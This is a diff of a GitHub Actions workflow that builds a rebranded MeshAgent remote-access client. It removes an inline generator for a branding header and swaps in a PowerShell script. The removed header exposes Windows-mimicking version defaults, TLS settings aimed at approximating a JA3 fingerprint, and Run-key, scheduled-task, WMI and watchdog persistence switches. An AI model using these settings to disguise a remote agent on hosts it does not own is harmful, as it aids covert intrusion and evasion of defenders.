@@ -84,9 +84,9 @@ jobs:
         id: fetch_config
         shell: pwsh
         run: |
-          $configPath = Join-Path (Get-Location) 'branding_config.json'
+          $configPath = Join-Path (Get-Location) 'branding_config.local.json'
           if (Test-Path $configPath) {
-            Write-Host "Using branding config from repository"
+            Write-Host "Using branding config from repository (branding_config.local.json)"
             Get-Content $configPath
             return
           }
@@ -98,122 +98,12 @@ jobs:
             return
           }
 
-          throw "branding_config.json not found and no branding payload provided via secrets."
+          throw "branding_config.local.json not found and no branding payload provided via secrets."
 
-      - name: Generate branding headers
+      - name: Embed branding headers
         shell: pwsh
         run: |
-          $script = @'
-          import json, os
-          cfg = json.load(open("branding_config.json","r"))
-          branding = cfg.get("branding", {})
-          network = cfg.get("network", {})
-          tls_cfg = cfg.get("tls", {})
-          tls_presets = cfg.get("tlsPresets", {})
-          tls_preset_name = cfg.get("tlsPreset", "")
-          if (not tls_cfg) and tls_preset_name and (tls_preset_name in tls_presets):
-              tls_cfg = tls_presets[tls_preset_name]
-
-          service_name = branding.get("serviceName", "MeshAgent")
-          display_name = branding.get("displayName", "Mesh Agent Background Service")
-          company_name = branding.get("companyName", "")
-          product_name = branding.get("productName", service_name)
-          description = branding.get("description", display_name)
-          binary_name = branding.get("binaryName", f"{service_name}.exe")
-          log_path = branding.get("logPath", "C:/ProgramData/MeshAgent/logs")
-
-          # Version info
-          version_info = branding.get("versionInfo", {})
-          file_version = version_info.get("fileVersion", "10.0.19041.0")
-          product_version = version_info.get("productVersion", "10.0.19041.0")
-
-          # Parse version strings
-          file_parts = file_version.split(".")
-          file_major = file_parts[0] if len(file_parts) > 0 else "10"
-          file_minor = file_parts[1] if len(file_parts) > 1 else "0"
-          file_build = file_parts[2] if len(file_parts) > 2 else "19041"
-          file_revision = file_parts[3] if len(file_parts) > 3 else "0"
-
-          prod_parts = product_version.split(".")
-          prod_major = prod_parts[0] if len(prod_parts) > 0 else "10"
-          prod_minor = prod_parts[1] if len(prod_parts) > 1 else "0"
-          prod_build = prod_parts[2] if len(prod_parts) > 2 else "19041"
-          prod_revision = prod_parts[3] if len(prod_parts) > 3 else "0"
-
-          endpoint = network.get("primaryEndpoint", "")
-          user_agent = network.get("userAgent", "MeshAgent/1.0")
-          # TLS/JA3-related optional settings
-          tls_min = tls_cfg.get("minVersion", "")
-          tls_max = tls_cfg.get("maxVersion", "")
-          cipher_list = tls_cfg.get("cipherList", "")
-          tls13_ciphers = tls_cfg.get("tls13Ciphers", "")
-          sig_algs = tls_cfg.get("signatureAlgorithms", "")
-          groups = tls_cfg.get("supportedGroups", "")
-          # Prefer ALPN from tls_cfg if present; else from network; default http/1.1
-          alpn_source = tls_cfg.get("alpn", network.get("alpn", ["http/1.1"]))
-          alpn_list = alpn_source if isinstance(alpn_source, list) else [str(alpn_source)]
-          alpn = ",".join(alpn_list)
-
-          header = f'''/* Generated file - do not edit. */
-          #ifndef GENERATED_MESHAGENT_BRANDING_H
-          #define GENERATED_MESHAGENT_BRANDING_H
-          #undef MESH_AGENT_SERVICE_FILE
-          #define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
-          #undef MESH_AGENT_SERVICE_NAME
-          #define MESH_AGENT_SERVICE_NAME TEXT("{display_name}")
-          #undef MESH_AGENT_COMPANY_NAME
-          #define MESH_AGENT_COMPANY_NAME "{company_name}"
-          #undef MESH_AGENT_PRODUCT_NAME
-          #define MESH_AGENT_PRODUCT_NAME "{product_name}"
-          #undef MESH_AGENT_FILE_DESCRIPTION
-          #define MESH_AGENT_FILE_DESCRIPTION "{description}"
-          #undef MESH_AGENT_INTERNAL_NAME
-          #define MESH_AGENT_INTERNAL_NAME "{binary_name}"
-          #undef MESH_AGENT_ORIGINAL_FILENAME
-          #define MESH_AGENT_ORIGINAL_FILENAME "{binary_name}"
-          #undef MESH_AGENT_COPYRIGHT
-          #define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
-          #undef MESH_AGENT_LOG_DIRECTORY
-          #define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")
-
-          /* Version Information */
-          #define MESH_AGENT_FILE_VERSION_MAJOR {file_major}
-          #define MESH_AGENT_FILE_VERSION_MINOR {file_minor}
-          #define MESH_AGENT_FILE_VERSION_BUILD {file_build}
-          #define MESH_AGENT_FILE_VERSION_REVISION {file_revision}
-          #define MESH_AGENT_FILE_VERSION_STR "{file_version}"
-
-          #define MESH_AGENT_PRODUCT_VERSION_MAJOR {prod_major}
-          #define MESH_AGENT_PRODUCT_VERSION_MINOR {prod_minor}
-          #define MESH_AGENT_PRODUCT_VERSION_BUILD {prod_build}
-          #define MESH_AGENT_PRODUCT_VERSION_REVISION {prod_revision}
-          #define MESH_AGENT_PRODUCT_VERSION_STR "{product_version}"
-
-          #define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
-          #define MESH_AGENT_NETWORK_SNI NULL
-          #define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
-          #define MESH_AGENT_NETWORK_JA3 NULL
-
-          /* TLS customization (best-effort JA3 approximation) */
-          #define MESH_AGENT_TLS_MIN_VERSION "{tls_min}"
-          #define MESH_AGENT_TLS_MAX_VERSION "{tls_max}"
-          #define MESH_AGENT_TLS_CIPHER_LIST "{cipher_list}"
-          #define MESH_AGENT_TLS13_CIPHERS "{tls13_ciphers}"
-          #define MESH_AGENT_TLS_SIGALGS "{sig_algs}"
-          #define MESH_AGENT_TLS_GROUPS "{groups}"
-          #define MESH_AGENT_ALPN "{alpn}"
-          #define MESH_AGENT_PERSIST_RUNKEY 0
-          #define MESH_AGENT_PERSIST_TASK 0
-          #define MESH_AGENT_PERSIST_WMI 0
-          #define MESH_AGENT_PERSIST_WATCHDOG 1
-          #endif
-          '''
-          os.makedirs("meshcore/generated", exist_ok=True)
-          open("meshcore/generated/meshagent_branding.h", "w").write(header)
-          print("Generated branding header successfully")
-          '@
-          $script | Out-File -FilePath "generate_branding.py" -Encoding utf8
-          python generate_branding.py
+          ./tools/embed_provisioning_simple.ps1 -ConfigPath ./branding_config.local.json
 
       - name: Restore NuGet packages
         shell: pwsh
@@ -505,3 +395,4 @@ jobs:
           prerelease: false
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
